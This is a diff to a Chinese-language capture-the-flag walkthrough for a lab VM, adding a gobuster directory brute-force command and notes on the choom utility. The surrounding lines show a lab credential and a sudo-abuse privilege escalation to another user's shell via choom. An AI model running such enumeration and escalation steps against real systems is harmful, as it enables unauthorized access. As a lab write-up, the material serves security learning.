@@ -9,6 +9,12 @@ nmap -sV -A -T4 -p- 192.168.44.134
 ```
 得到只开放了80和22端口
 
+# 目录爆破
+
+```css
+gobuster dir -u http://192.168.44.134/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,txt,php
+```
+
 只是个输入框，尝试输入，发现我们输入的字符被替换了然后显示
 尝试发现是26个字母倒叙替换
 也可以通过https://www.dcode.fr/cipher-identifier 发现是使用atbash编码
@@ -75,6 +81,15 @@ https://gtfobins.github.io/gtfobins/choom/
 su ocean //输入密码：ayurv3d4
 sudo -l
 //发现有个(india) NOPASSWD: /usr/bin/choom   这可以让我免密提权至india用户权限
+```
+
+
+**choom**      命令是 util-linux 软件包的一部分
+不会用这个命令就去找man：[choom(1) - Linux manual page](https://man7.org/linux/man-pages/man1/choom.1.html)
+[Ubuntu Manpage: choom - display and adjust OOM-killer score.](https://manpages.ubuntu.com/manpages/focal/en/man1/choom.1.html)
+
+
+```C
 sudo -u india /usr/bin/choom -n 0 /bin/sh
 script /dev/null -c bash
 ```
